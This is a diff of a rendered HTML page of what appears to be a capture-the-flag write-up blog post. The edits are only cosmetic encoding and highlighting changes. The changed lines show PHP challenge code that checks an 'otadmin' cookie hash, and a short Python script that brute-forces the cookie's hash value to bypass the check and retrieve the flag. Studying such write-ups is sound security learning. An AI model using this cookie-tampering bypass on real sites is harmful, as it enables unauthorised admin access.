@@ -24,7 +24,7 @@
     <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/academicons@1.9.1/css/academicons.min.css" integrity="sha256-i1+4qU2G2860dGGIOJscdC30s9beBXjFfzjWLjBRsBg=" crossorigin="anonymous">
-    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700%7CRoboto+Slab:100,300,400,500,700%7CMaterial+Icons">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons">
 
     <!-- Code Syntax Highlighting -->
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jwarby/jekyll-pygments-themes@master/github.css" media="" id="highlight_theme_light">
@@ -187,7 +187,7 @@ We were greeted with a normal directory listing page where we had two files, <co
     <span class="k">exit</span><span class="p">();</span>
 <span class="p">}</span>
 
-<span class="nv">$session_data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="err">$\</span><span class="n">_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nv">$session_data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="err">$</span><span class="n">\_COOKIE</span><span class="p">[</span><span class="s1">'otadmin'</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
 
 <span class="k">if</span> <span class="p">(</span><span class="nv">$session_data</span> <span class="o">===</span> <span class="kc">NULL</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"COOKIE TAMPERING xD IM A SECURITY EXPERT</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">();</span> <span class="p">}</span>
 
@@ -228,13 +228,13 @@ Good enough, makes it more easier not to bruteforce the md5 result and bypassing
 
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#Author: gokul
 </span><span class="kn">import</span> <span class="n">requests</span>
-<span class="n">url</span> <span class="o">=</span> <span class="s">""</span>                                              <span class="c1">#point to the chal location
+<span class="n">url</span> <span class="o">=</span> <span class="sh">""</span>                                              <span class="c1">#point to the chal location
 </span>
 <span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">999</span><span class="p">):</span>
-        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s">'otadmin'</span><span class="p">:</span><span class="s">'{"hash": '</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">'}'</span><span class="p">}</span>  <span class="c1">#passing on the cookie
+        <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">otadmin</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="s">: </span><span class="sh">'</span><span class="o">+</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="sh">'</span><span class="s">}</span><span class="sh">'</span><span class="p">}</span>  <span class="c1">#passing on the cookie
 </span>        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>           
-        <span class="k">if</span> <span class="s">'p4'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>                            <span class="c1">#checking for flag which starts with p4, likely to be in display_admin()
+        <span class="k">if</span> <span class="sh">'</span><span class="s">p4</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>                            <span class="c1">#checking for flag which starts with p4, likely to be in display_admin()
 </span>            <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
             <span class="k">break</span></code></pre></figure>
 
